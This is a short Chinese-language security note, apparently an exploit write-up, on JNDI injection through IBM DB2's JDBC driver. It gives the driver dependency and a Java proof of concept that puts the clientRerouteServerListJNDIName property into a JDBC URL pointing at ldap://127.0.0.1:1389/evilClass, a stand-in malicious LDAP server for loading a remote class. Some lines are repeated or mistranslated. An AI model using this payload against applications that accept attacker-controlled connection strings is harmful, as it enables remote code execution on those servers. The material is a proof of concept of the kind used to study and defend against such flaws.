# IBM-DB2

在DB2中，Litch1发现这个clientRerouteServerListJNDINameIdentifies。

这是一个JNDI引用，指向一个DB2ClientRerouteServerList实例，在JNDI存储库中的
clientRerouteServerListJNDIName只适用于IBM Data Server Driver for JDBC和SQL Server。
ClientRerouteServerListJNDIName仅适用于IBM Data Server Driver for JDBC和SQLJ type 4连接，以及通过DataSource接口建立的连接。
通过DataSource接口建立的连接。

这意味着这个属性在JDBC URL配置中给了我们一个JNDI注入

依赖

```xml
<dependency>
  <groupId>com.ibm.db2</groupId>
  <artifactId>jcc</artifactId>
  <version>11.5.0.0</version>
</dependency>
```

简简单单

```java
public static void main(String[] args) throws Exception {
    Class.forName("com.ibm.db2.jcc.DB2Driver");
    DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;");
}
```

